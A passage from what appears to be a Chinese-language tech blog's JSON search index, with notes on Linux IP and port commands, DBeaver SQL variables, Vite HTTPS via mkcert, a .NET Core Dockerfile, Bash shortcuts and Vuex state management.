preferred_lft forever inet 10.89.8.110/24 brd 10.89.8.255 scope global secondary eth0:110 valid_lft forever preferred_lft forever inet 10.89.8.113/24 brd 10.89.8.255 scope global secondary eth0:113 valid_lft forever preferred_lft forever inet 10.89.8.114/24 brd 10.89.8.255 scope global secondary eth0:114 valid_lft forever preferred_lft forever inet 10.89.8.115/24 brd 10.89.8.255 scope global secondary eth0:115 valid_lft forever preferred_lft forever inet 10.89.8.116/24 brd 10.89.8.255 scope global secondary eth0:116 valid_lft forever preferred_lft forever inet 10.89.8.117/24 brd 10.89.8.255 scope global secondary eth0:117 valid_lft forever preferred_lft forever inet 10.89.8.118/24 brd 10.89.8.255 scope global secondary eth0:118 valid_lft forever preferred_lft forever inet 10.89.8.165/24 brd 10.89.8.255 scope global secondary eth0:165 valid_lft forever preferred_lft forever inet 10.89.8.193/24 brd 10.89.8.255 scope global secondary eth0:193 valid_lft forever preferred_lft forever inet 10.89.8.91/24 brd 10.89.8.255 scope global secondary eth0:91 valid_lft forever preferred_lft forever inet6 fe80::f002:2aff:feff:b865/64 scope link ","date":"2021-07-14","objectID":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/:2:2","tags":["network","ip","route"],"title":"查看 IP 指令和路由筆記","uri":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"被廢棄掉的指令(彩蛋) 有空詳細記錄。 ifconfig -\u003e ip a traceroute -\u003e tracepath linux - traceroute command: replacement or alternative - Unix \u0026 Linux Stack Exchange route -\u003e ip route Deprecated Linux networking commands and their replacements | Doug Vitale Tech Blog Reference: rh_ip_command_cheatsheet_1214_jcs_print.pdf ","date":"2021-07-14","objectID":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/:3:0","tags":["network","ip","route"],"title":"查看 IP 指令和路由筆記","uri":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/"},{"categories":["網路"],"content":"查看 ip expose port [轉]Linux 查看程式用哪些 port 方法 | 程式狂想筆記 netstat -an |grep LISTEN ss -an |grep LISTEN ","date":"2021-07-14","objectID":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/:3:1","tags":["network","ip","route"],"title":"查看 IP 指令和路由筆記","uri":"/blog/posts/%E6%9F%A5%E7%9C%8B-IP-%E6%8C%87%E4%BB%A4%E5%92%8C%E8%B7%AF%E7%94%B1%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"Dbeaver 使用變數 做SQL 範本 和查詢設定 title ","date":"2021-07-14","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8-%E5%81%9ASQL-%E7%AF%84%E6%9C%AC-%E5%92%8C%E6%9F%A5%E8%A9%A2%E8%A8%AD%E5%AE%9A-title/:0:0","tags":["dbeaver","sql"],"title":"Dbeaver 使用變數 做SQL 範本 和查詢設定 title","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8-%E5%81%9ASQL-%E7%AF%84%E6%9C%AC-%E5%92%8C%E6%9F%A5%E8%A9%A2%E8%A8%AD%E5%AE%9A-title/"},{"categories":["實用工具"],"content":"Dbeaver 使用變數 @set a = '1' @set b = '1' SELECT :a FROM dual; SELECT :b FROM dual; 按下 可查多個查詢 ","date":"2021-07-14","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8-%E5%81%9ASQL-%E7%AF%84%E6%9C%AC-%E5%92%8C%E6%9F%A5%E8%A9%A2%E8%A8%AD%E5%AE%9A-title/:1:0","tags":["dbeaver","sql"],"title":"Dbeaver 使用變數 做SQL 範本 和查詢設定 title","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8-%E5%81%9ASQL-%E7%AF%84%E6%9C%AC-%E5%92%8C%E6%9F%A5%E8%A9%A2%E8%A8%AD%E5%AE%9A-title/"},{"categories":["實用工具"],"content":"sql developer 使用變數方法(番外) define abc=1; select * from dual where rownum=\u0026abc; ","date":"2021-07-14","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8-%E5%81%9ASQL-%E7%AF%84%E6%9C%AC-%E5%92%8C%E6%9F%A5%E8%A9%A2%E8%A8%AD%E5%AE%9A-title/:1:1","tags":["dbeaver","sql"],"title":"Dbeaver 使用變數 做SQL 範本 和查詢設定 title","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8-%E5%81%9ASQL-%E7%AF%84%E6%9C%AC-%E5%92%8C%E6%9F%A5%E8%A9%A2%E8%A8%AD%E5%AE%9A-title/"},{"categories":["實用工具"],"content":"設定查詢標籤 一般我們維運不可能只查一次SQL 多個SQL執行，標籤不好分辨是什麼 我有查到使用方式 @set a = '1' @set b = '1' -- title: test1 SELECT :a FROM dual; -- title: test2 SELECT :b FROM dual; 參考: mysql - Is there a way to define the names of the result tabs names in an SQL Script in DBeaver? - Stack Overflow ","date":"2021-07-14","objectID":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8-%E5%81%9ASQL-%E7%AF%84%E6%9C%AC-%E5%92%8C%E6%9F%A5%E8%A9%A2%E8%A8%AD%E5%AE%9A-title/:2:0","tags":["dbeaver","sql"],"title":"Dbeaver 使用變數 做SQL 範本 和查詢設定 title","uri":"/blog/posts/Dbeaver-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8-%E5%81%9ASQL-%E7%AF%84%E6%9C%AC-%E5%92%8C%E6%9F%A5%E8%A9%A2%E8%A8%AD%E5%AE%9A-title/"},{"categories":["Vue"],"content":"現在很多開發都需要 HTTPS ，但是在 localhost 預設是沒有 HTTPS，要怎麼在 Vite 快速在開發環境用 HTTPS？爬了一些 Google 文章，來記錄一下。 ","date":"2021-07-04","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/:0:0","tags":["vite","vue","tls","mkcert"],"title":"Vite 使用 https 憑證服務方法(搭 mkcert )","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/"},{"categories":["Vue"],"content":"舊文使用方式 [Vite] Enabling https on localhost - DEV Community ","date":"2021-07-04","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/:1:0","tags":["vite","vue","tls","mkcert"],"title":"Vite 使用 https 憑證服務方法(搭 mkcert )","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/"},{"categories":["Vue"],"content":"安裝 vite-plugin-mkcert vite-plugin-mkcert/README-zh_CN.md at main · liuweiGL/vite-plugin-mkcert ","date":"2021-07-04","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/:2:0","tags":["vite","vue","tls","mkcert"],"title":"Vite 使用 https 憑證服務方法(搭 mkcert )","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/"},{"categories":["Vue"],"content":"安裝 vite-plugin-mkcert vite \u0026 mkcert Windows 使用 Administrator 帳號安裝 mkcert!! Windows 使用 Administrator 帳號安裝 mkcert!! Windows 使用 Administrator 帳號安裝 mkcert!! choco install mkcert # 安裝指令不用做，vite-plugin-mkcert 就會幫忙做 # mkcert -install # mkcert localhost # 沒執行過 mkcert 可以用 Administrator 執行 npm install vite-plugin-mkcert -D Linux 可參考FiloSottile/mkcert: A simple zero-config tool to make locally trusted development certificates with any names you’d like.，步驟可能需要自己編譯 ","date":"2021-07-04","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/:2:1","tags":["vite","vue","tls","mkcert"],"title":"Vite 使用 https 憑證服務方法(搭 mkcert )","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/"},{"categories":["Vue"],"content":"配置 vite vite.config.js import { defineConfig } from 'vite' import mkcert from 'vite-plugin-mkcert' // https://vitejs.dev/config/ export default defineConfig({ server: { https: true }, plugins: [mkcert()] }) 簡單注意: import mkcert from 'vite-plugin-mkcert' https: true plugins: [mkcert()] ","date":"2021-07-04","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/:2:2","tags":["vite","vue","tls","mkcert"],"title":"Vite 使用 https 憑證服務方法(搭 mkcert )","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/"},{"categories":["Vue"],"content":"執行 Vite npm run dev 第一次會跳出下面圖示，會安裝CA到電腦上面，記得按是。 如果看到不受信任網域，瀏覽器可能需要關掉重開，才能正常看到。 基本上做到這邊就完成了，如果你還有興趣可以往下看。 ","date":"2021-07-04","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/:2:3","tags":["vite","vue","tls","mkcert"],"title":"Vite 使用 https 憑證服務方法(搭 mkcert )","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/"},{"categories":["Vue"],"content":"憑證跑去哪? 在環境變數加入下面這段 # window powershell $Env:DEBUG = \"vite:plugin:mkcert\" # linux export DEBUG = \"vite:plugin:mkcert\" window powershell 詳細使用環境變數方法關於環境變數 - PowerShell | Microsoft Docs The certificate is saved in: C:\\Users\\Administrator\\.vite-plugin-mkcert\\certs\\dev.key C:\\Users\\Administrator\\.vite-plugin-mkcert\\certs\\dev.pem log 打開可以看到放在家目錄。程式碼也可以看到裡面這樣寫(vite-plugin-mkcert/constant.ts at main · liuweiGL/vite-plugin-mkcert) ","date":"2021-07-04","objectID":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/:3:0","tags":["vite","vue","tls","mkcert"],"title":"Vite 使用 https 憑證服務方法(搭 mkcert )","uri":"/blog/posts/Vite-%E4%BD%BF%E7%94%A8-https-%E6%86%91%E8%AD%89%E6%9C%8D%E5%8B%99%E6%96%B9%E6%B3%95-%E6%90%AD-mkcert/"},{"categories":["Docker"],"content":"最近同事收到要把.Net Core程式轉移到 K8S，但是維運不會處理 Image，剛好我對 Docker 有小小的研究，但對 .Net Core 不是很熟，最後爬了文章，成功處理 Image。 ","date":"2021-06-27","objectID":"/blog/posts/Net-Core-%E5%BB%BA%E7%BD%AE-Docker-%E6%98%A0%E5%83%8F%E6%AA%94/:0:0","tags":["docker",".net core"],"title":".Net Core 建置 Docker 映像檔","uri":"/blog/posts/Net-Core-%E5%BB%BA%E7%BD%AE-Docker-%E6%98%A0%E5%83%8F%E6%AA%94/"},{"categories":["Docker"],"content":"Dockerfile 參考 dotnet-docker/nuget-credentials.md at 203e3e7c2cbb6a4ac73290c603ef02d249128500 · dotnet/dotnet-docker · GitHub dotnet-docker/samples/aspnetapp at main · dotnet/dotnet-docker · GitHub ","date":"2021-06-27","objectID":"/blog/posts/Net-Core-%E5%BB%BA%E7%BD%AE-Docker-%E6%98%A0%E5%83%8F%E6%AA%94/:1:0","tags":["docker",".net core"],"title":".Net Core 建置 Docker 映像檔","uri":"/blog/posts/Net-Core-%E5%BB%BA%E7%BD%AE-Docker-%E6%98%A0%E5%83%8F%E6%AA%94/"},{"categories":["Docker"],"content":"執行遇到錯誤 原開發是 window ，程式搬到 docker ，執行會有錯誤。如下: #12 1.179 /usr/share/dotnet/sdk/5.0.202/Sdks/Microsoft.NET.Sdk/targets/Microsoft.PackageDependencyResolution.targets(241,5): error MSB4018: The \"ResolvePackageAssets\" task failed unexpectedly. [/source/xxxx/xxxx.csproj] #12 1.179 /usr/share/dotnet/sdk/5.0.202/Sdks/Microsoft.NET.Sdk/targets/Microsoft.PackageDependencyResolution.targets(241,5): error MSB4018: NuGet.Packaging.Core.PackagingException: Unable to find fallback package folder 由於 docker 上環境路徑不正確，做後發現下dotnet restore可以解決…，因為我不是寫 .Net Core 我就先忽略研究，初估重製環境設定路徑。 dotnet restore ","date":"2021-06-27","objectID":"/blog/posts/Net-Core-%E5%BB%BA%E7%BD%AE-Docker-%E6%98%A0%E5%83%8F%E6%AA%94/:2:0","tags":["docker",".net core"],"title":".Net Core 建置 Docker 映像檔","uri":"/blog/posts/Net-Core-%E5%BB%BA%E7%BD%AE-Docker-%E6%98%A0%E5%83%8F%E6%AA%94/"},{"categories":["Docker"],"content":"範例 # https://hub.docker.com/_/microsoft-dotnet FROM mcr.microsoft.com/dotnet/sdk:5.0 AS build WORKDIR /source # copy csproj and restore as distinct layers # COPY *.sln . # COPY APP_PROJECT/*.csproj ./APP_PROJECT/ # copy everything else and build app COPY APP_PROJECT/. ./APP_PROJECT/ WORKDIR /source/APP_PROJECT RUN dotnet restore RUN dotnet publish -c release -o /app --no-restore # final stage/image FROM mcr.microsoft.com/dotnet/aspnet:5.0 WORKDIR /app COPY --from=build /app ./ EXPOSE 80 ENTRYPOINT [\"dotnet\", \"APP_PROJECT.dll\"] APP_PROJECT 再置換掉對應專案名稱 因為我朋友專案沒有sln 檔案，所以上面那幾但註解 這樣就順利 build 出 docker image ","date":"2021-06-27","objectID":"/blog/posts/Net-Core-%E5%BB%BA%E7%BD%AE-Docker-%E6%98%A0%E5%83%8F%E6%AA%94/:3:0","tags":["docker",".net core"],"title":".Net Core 建置 Docker 映像檔","uri":"/blog/posts/Net-Core-%E5%BB%BA%E7%BD%AE-Docker-%E6%98%A0%E5%83%8F%E6%AA%94/"},{"categories":["Linux"],"content":"My 5 Favorite Linux Shell Tricks for SPEEEEEED (and efficiency) - YouTube 看到 Youtube 推薦 Linux 操作技巧，感覺特別有趣，所以紀錄一下。 1:04​ - sudo !! - re-run previous command with ‘sudo’ prepended 1:53​ - ctrl-k, ctrl-u, ctrl-w, ctrl-y - cutting and pasting text in the command line Ctrl+K 刪後面文字 Ctrl+U 刪前面文字 “Alt + backspace” is more useful than “ctrl + w” Bash Shell 快速鍵 – Tsung’s Blog Bash環境下 Ctrl+A~Z @ Altohorn-linux :: 隨意窩 Xuite日誌 3:24​ - practical kill/yank example Ctrl+U 剪下全部 Ctrl+Y 貼上 4:04​ - use ’less +F’ to view logfiles, instead of ’tail’ (ctrl-c, shift-f, q to quit) 使用less +F滚动查看日志_polygun2000_新浪博客 6:25​ - ctrl-x-e - continue editing your current shell line in a text editor (uses $EDITOR) 7:54​ - alt-. - paste previous command’s argument (useful for running multiple commands on the same resource) 9:18​ - reset - resets/unborks your terminal 最近看Bash Hotkey貓紙 - I.T. 9 遊戲日誌 - Medium，跟上面介紹影片一樣 ","date":"2021-06-27","objectID":"/blog/posts/Linux-%E6%93%8D%E4%BD%9C%E6%8A%80%E5%B7%A7/:0:0","tags":["linux"],"title":"Linux Bash 操作技巧","uri":"/blog/posts/Linux-%E6%93%8D%E4%BD%9C%E6%8A%80%E5%B7%A7/"},{"categories":["Vue"],"content":"這篇 Vuex 學習筆記，會大量引用Vuex 官方文章，算是自己學習重點筆記。 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:0:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"心法 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:1:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"狀態管理模式 const Counter = { // 狀態 data () { return { count: 0 } }, // 視圖 template: ` \u003cdiv\u003e{{ count }}\u003c/div\u003e `, // 操作 methods: { increment () { this.count++ } } } createApp(Counter).mount('#app') 以上包含以下幾個部分： 狀態，驅動應用的數據源； 視圖，以聲明方式將狀態映射到視圖； 操作，響應在視圖上的用戶輸入導致的狀態變化。 詳細Vuex 是什么？ | Vuex ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:1:1","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"vuex Vuex 是什么？ | Vuex ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:1:2","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"非套件做到的狀態管理 状态管理 | Vue.js ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:1:3","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"安裝 npm install vuex@next --save ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:2:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"最簡單的 Store Vuex 和單純的全局對象有以下兩點不同： Vuex 的狀態存儲是響應式的。當 Vue 組件從 store 中讀取狀態的時候，若 store 中的狀態發生變化，那麼相應的組件也會相應地得到高效更新。 你不能直接改變 store 中的狀態。改變 store 中的狀態的唯一途徑就是顯式地提交 (commit) mutation。這樣使得我們可以方便地跟蹤每一個狀態的變化，從而讓我們能夠實現一些工具幫助我們更好地瞭解我們的應用。 簡單來講，處理 store 狀態需要提交(commit) mutation 。(所以外部操作 vuex store 可以修改?) Success mutation 翻譯為變化；浮沉盛衰；變質 參考:mutation - Yahoo奇摩字典 搜尋結果 一個初始 state 對象和一些 mutation： 這邊還滿有趣的，vuex4 和 vuex3 這邊寫法就不一樣了 Main.js import { createApp } from 'vue' import { createStore } from 'vuex' import App from './App.vue' // 創建一個新的 store 實例 const store = createStore({ state () { return { count: 0 } }, mutations: { increment (state) { state.count++ } } }) // 將 store 實例作為插件安裝 // app.use(store) createApp(App).use(store).mount('#app') //測試 store.commit('increment') console.log(store.state.count) // -\u003e 1 // 證明也是能直接改 state store.state.count=100 console.log(store.state.count) 之前看到舊版本使用 $this.store，但看新版本好像很少這樣看到。 為了修復 issue #994，Vuex 4 刪除了 this.$store 在 Vue 組件中的全局類型聲明。當使用 TypeScript 時，必須聲明自己的模塊補充(module augmentation)。 可能是因為要讓 TypeScript 支援原因，可參考:從 3.x 遷移到 4.0 | Vuex。 組件呼叫改 State 狀態 methods: { increment() { this.$store.commit('increment') console.log(this.$store.state.count) } } GIT: https://github.com/malagege/vuex-test/commit/a05d6cc9bd64e11de6be51a57a1f1e547b637a46 再次強調，我們通過提交 mutation 的方式，而非直接改變 store.state.count，是因為我們想要更明確地追蹤到狀態的變化。這個簡單的約定能夠讓你的意圖更加明顯，這樣你在閱讀代碼的時候能更容易地解讀應用內部的狀態改變。此外，這樣也讓我們有機會去實現一些能記錄每次狀態改變，保存狀態快照的調試工具。有了它，我們甚至可以實現如時間穿梭般的調試體驗。 由於 store 中的狀態是響應式的，在組件中調用 store 中的狀態簡單到僅需要在計算屬性中返回即可。觸發變化也僅僅是在組件的 methods 中提交 mutation。 這邊修改store.state 需要透過 Vue Component 的 method 去做提交(commit) mutation 。 這邊修改store.state 需要透過 Vue Component 的 method 去做提交(commit) mutation 。 這邊修改store.state 需要透過 Vue Component 的 method 去做提交(commit) mutation 。 因為看起來很重要，所以講三遍XD ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:2:1","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"State Vuex 使用單一狀態樹——是的，用一個對象就包含了全部的應用層級狀態。至此它便作為一個「唯一數據源 (SSOT )」而存在。 在 Vue 組件中獲得 Vuex 狀態，一般都是用 computed 狀態取得出來。计算属性和侦听器 — Vue.js // 創建一個 Counter 組件 const Counter = { template: `\u003cdiv\u003e{{ count }}\u003c/div\u003e`, computed: { count () { return store.state.count } } } Vuex 通過 Vue 的插件系統將 store 實例從根組件中「注入」到所有的子組件裡。且子組件能通過 this.$store 訪問到。讓我們更新下 Counter 的實現： const Counter = { template: `\u003cdiv\u003e{{ count }}\u003c/div\u003e`, computed: { count () { return this.$store.state.count } } } ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:3:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"mapState 輔助函數 小記：通常用在 computed 上面 當一個組件需要獲取多個狀態的時候，將這些狀態都聲明為計算屬性會有些重複和冗餘。為瞭解決這個問題，我們可以使用 mapState 輔助函數幫助我們生成計算屬性，讓你少按幾次鍵： // 在單獨構建的版本中輔助函數為 Vuex.mapState import { mapState } from 'vuex' export default { // ... computed: mapState({ // 箭頭函數可使代碼更簡練 count: state =\u003e state.count, // 傳字符串參數 'count' 等同於 `state =\u003e state.count` countAlias: 'count', // 為了能夠使用 `this` 獲取局部狀態，必須使用常規函數 countPlusLocalState (state) { return state.count + this.localCount } }) } (一般)使用 computed: mapState([ // 映射 this.count 為 store.state.count 'count' ]) GIT: https://github.com/malagege/vuex-test/commit/4e9b200cdcca3a043ff9e94c446b2d4900c1e5d0 但一般 computed 不可能全部包給 mapState。所以我們要可以使用 ES 解構。 computed: { localComputed () { /* ... */ }, // 使用對象展開運算符將此對象混入到外部對象中 ...mapState({ count: state=\u003estate.count, // ... }) } GIT: https://github.com/malagege/vuex-test/commit/9c690013d6cc52afc1cd72eb801ac16fc4bf5d1d 小記 console.log(mapState({count:state=\u003estate.count})) 這邊查看結果，mapState會回傳物件，然後用...解構回去塞進 computed。 這邊mapState有兩個用法。 帶 Array 帶 物件(Object) Array，只能帶字串，不能做到客製化。 Object ，可做到多個客製化。 這邊第一次看，會有點混亂，分成兩類看就還好。 回顧 State，簡單來說就是 vuex 的 state (狀態)要在 Compment 取得時候用 computed 去做 mapState 動作。 等等，程式是死的，人是活的，可以在 methods 呼叫? 這當然是可以，但為了程式可用性，最好不要用在別的地方。 好了，當然我用在 methods 上面不能使用。應該跟內部程式有關係。 mapState({count:state=\u003estate.count}).count 也能讀到資料。但正常不會正樣用 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:3:1","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Getter 有點像 一般 Component 的 computed。 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:4:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":" main.js (官方這邊文件有寫錯…) const store = createStore({ state: { todos: [ { id: 1, text: '...', done: true }, { id: 2, text: '...', done: false } ] }, getters: { doneTodos(state){ return state.todos.filter(todo =\u003e todo.done) } } }) console.log( store.getters.doneTodos[0].id) console.log('store.getters.doneTodos :' + store.getters.doneTodos ) GIT: https://github.com/malagege/vuex-test/commit/750360bfa2a97e02aa1c84708a33edfe9718366e ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:4:1","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"通過屬性訪問 getters: { // ... doneTodosCount (state, getters) { return getters.doneTodos.length } } 這邊比較特別看第二參數是用getters，裡面可以用 getters 變數 當然也可以用 computed: { doneTodosCount () { return this.$store.getters.doneTodosCount } } ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:4:2","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"通過方法訪問(特別) getters: { // ... getTodoById: (state) =\u003e (id) =\u003e { return state.todos.find(todo =\u003e todo.id === id) } } GIT: https://github.com/malagege/vuex-test/commit/536f50d2aab41bf5448b6f617f124a8913a808aa 簡單說，Function 裡面回傳 Function 。還滿特別用法。 ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:4:3","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"mapGetters 輔助函數 也是用在computed。 import { mapGetters } from 'vuex' export default { // ... computed: { // 使用對象展開運算符將 getter 混入 computed 對象中 ...mapGetters([ 'doneTodosCount', 'anotherGetter', // ... ]) } } ...mapGetters({ // 把 `this.doneCount` 映射為 `this.$store.getters.doneTodosCount` doneCount: 'doneTodosCount' }) ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:4:4","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Mutation 提交 mutations 是改變 Vuex 中 store 的唯一方式。 mutations 非常類似於組件中的事件（event），每個 mutation 都有一個字串的 事件類型 (type) 和一個回調函數 (handler)， handler 就是我們實際進行狀態更改的地方，並且他會接受 state 作為第一個參數 [Vue.js] Vuex 學習筆記 (7) - mutations 的核心概念 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天備份圖 這邊我原本看不懂這句mutations 非常類似於組件中的事件（event），每個 mutation 都有一個字串的 事件類型 (type) 和一個回調函數 (handler)，後來看到上面文字敘述才了解。 簡單來說，事件類型 (type)我們常用 JS Event 都是用 trigger 去觸發事件，Vuex 是用 store.commit，一個回調函數 (handler)是指 store 裡的 mutations 的 function ，type命名在function 上面。這樣看真的很像 Event。 可參照上面敘述看下面程式: const store = createStore({ state: { count: 1 }, mutations: { increment (state) { // 变更状态 state.count++ } } }) 呼叫 mutation 要用 store.commit('increment') GIT: https://github.com/malagege/vuex-test/commit/00bd0b93a7ffb3d41a413eabc519cb15a3a2df2f ","date":"2021-06-27","objectID":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:5:0","tags":["vue","vuex"],"title":"Vuex 學習筆記","uri":"/blog/posts/Vuex-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"什麼是 payload payload意思即為承載量，在開發中則是指出在一堆資料中我們所關心的部分! google到一篇很好的文章對payload為何這樣叫有很好的解釋，文中指出這個名詞是借用運輸工具上的觀念而來的，例如：卡車、油罐車、貨輪等所謂的載具，然後通常一個載具的總重量一定大於載具的承載量，例如油罐車的總重量包含了他所運載的油量、司機的重量、油罐車行駛所需的油量，但我們所關心僅是油罐車所承載的油量而已。 